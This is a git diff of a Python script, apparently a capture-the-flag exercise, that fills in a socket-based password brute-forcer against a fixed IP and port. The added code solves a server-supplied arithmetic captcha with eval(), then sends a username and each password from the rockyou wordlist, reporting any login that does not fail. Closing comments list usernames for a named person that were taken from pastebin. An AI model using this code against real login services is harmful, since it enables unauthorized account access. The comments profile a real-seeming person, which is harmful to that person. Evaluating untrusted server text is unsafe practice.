@@ -25,12 +25,15 @@
 """
 
 import socket
+import time
 
-host = "" # IP address here
-port = 0000 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+host = "157.230.179.99" # IP address here
+port = 1337 # Port here
+wordlist = "rockyou.txt" # Point to wordlist file
 
-def brute_force():
+slp = 1
+
+def brute_force(username, password):
     """
         Sockets: https://docs.python.org/2/library/socket.html
         How to use the socket s:
@@ -55,11 +58,61 @@ def brute_force():
             v0idcache's server.
     """
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+    time.sleep(slp)
 
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
 
+    time.sleep(slp)
 
+    data = s.recv(1024)
+
+    print(data)
+
+    captcha = data.decode()[17:].split(' ')
+    captcha_result = eval(captcha[0] + ((2 * captcha[1]) if captcha[1] == '/' else captcha[1]) + captcha[2])
+
+#    print(captcha_result)
+
+    s.send((str(captcha_result) + '\n').encode())
+
+    time.sleep(slp)
+
+    data = s.recv(1024)
+
+    print(data) 
+
+#    username = ""   # Hint: use OSINT
+#    password = ""   # Hint: use wordlist
+
+    s.send((username + '\n').encode())
+
+    time.sleep(slp)
+
+    data = s.recv(1024)
+    
+    print(data)
+
+    s.send((password + '\n').encode())
+
+    time.sleep(slp)
+
+    data = s.recv(1024)
+    print(data)
+
+    time.sleep(slp)
+    
+    if 'Fail' not in str(data):
+        print("FOUND ==========================================")
 
 if __name__ == '__main__':
-    brute_force()
+    file = open("rockyou.txt", encoding='utf-8', errors='ignore')
+    file_list = file.read().split('\n')
+    file.close()
+
+    for word in file_list:
+        brute_force("*", word)
+        print(word)
+# is able to insert captcha and username and go through wordlist.
+# I tried with ejnorman84, ejnoman, ejnorman, and EricNorman84 which I found on pastebin but I couldn't get in.
+# is very slow, usually fails at faster speed.
